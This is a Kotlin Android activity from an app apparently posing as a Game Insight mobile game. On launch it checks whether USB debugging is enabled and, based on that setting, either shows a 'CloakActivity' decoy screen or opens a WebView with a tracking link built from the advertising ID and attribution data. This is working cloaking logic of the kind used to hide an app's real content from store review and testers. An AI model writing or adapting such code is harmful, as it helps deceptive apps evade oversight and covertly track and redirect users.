package com.gameinsight.gplay.islan.ui.activities

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.gameinsight.gplay.islan.databinding.HostAcBinding
import com.gameinsight.gplay.islan.ui.viewmodel.AresViewModel
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.*

class FirstActivity : BaseActivity<HostAcBinding>() {
    private var link: String? = null
    private lateinit var adbString: String
    private var advID: String = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        installSplashScreen()
        super.onCreate(savedInstanceState)
        mViewBinding = initViewBinding()
        setContentView(viewBinding!!.root)
        initViewModel()
        viewModel.loadDp(this)
        viewModel.loadAF(this)
        lifecycleScope.launch(Dispatchers.IO) {
            val ctx = this@FirstActivity
            advID = getAdvId(ctx).await()
            OneSignal.initWithContext(ctx)
            OneSignal.setAppId("a2ce5b97-a3eb-4ed9-87ae-7139273ba30d")
            OneSignal.setExternalUserId(advID)
            if (!viewModel.isDirExist(ADB_PATH, ctx)) {
                viewModel.saveInfo(ctx, ADB_PATH, secureCheck())
            }
            adbString = viewModel.getInfo(ctx, ADB_PATH)
            if (viewModel.isDirExist(LINK_PATH, ctx)) {
                lifecycleScope.launch(Dispatchers.Main) {
                    link = viewModel.getInfo(ctx, LINK_PATH)
                    naviGateTo(link!!, adbString)
                }
            } else {
                lifecycleScope.launch(Dispatchers.Main) {
                    viewModel.dpLiveData.observe(ctx) { dp ->
                        Log.d("QQQ", "it's dp in uri build $dp")
                        if (dp != "null") {
                            link = viewModel.buildLink(dp, null, advID, ctx)
                            viewModel.makeTag(dp, null)
                            naviGateTo(link!!, adbString)
                        } else {
                            viewModel.afLiveData.observe(ctx) { afData ->
                                Log.d("QQQ", "it's data in uri build $afData")
                                link = viewModel.buildLink("null", afData, advID, ctx)
                                viewModel.makeTag("null", afData)
                                naviGateTo(link!!, adbString)
                            }
                        }
                    }
                }
            }
        }
    }

    private fun secureCheck(): String {
        return Settings.Global.getString(
            this@FirstActivity.contentResolver,
            Settings.Global.ADB_ENABLED
        )
    }

    private fun initViewModel() {
        viewModel = ViewModelProvider(this)[AresViewModel::class.java]
        Log.d("QQQ", "init VM")
    }

    override fun initViewBinding() = HostAcBinding.inflate(layoutInflater)
    override fun naviGateTo(link: String, adb: String) {
        Log.d("qqq", "url before nav to web $link")
        if (adb != "1") {
            with(Intent(this, CloakActivity::class.java)) {
                startActivity(this)
                this@FirstActivity.finish()
            }
        } else {
            with(Intent(this, WebViewActivity::class.java)) {
                this.putExtra(INTENT_EXTRA, link)
                startActivity(this)
                this@FirstActivity.finish()
            }
        }
    }

    private fun getAdvId(ctx: Context) = CoroutineScope(Dispatchers.IO).async {
        OneSignal.initWithContext(ctx)
        OneSignal.setAppId("a2ce5b97-a3eb-4ed9-87ae-7139273ba30d")
        AdvertisingIdClient.getAdvertisingIdInfo(ctx).id.toString()
    }

    companion object {
        const val ADB_PATH = "adb.txt"
        const val LINK_PATH = "link.txt"
        const val INTENT_EXTRA = "link"
    }
}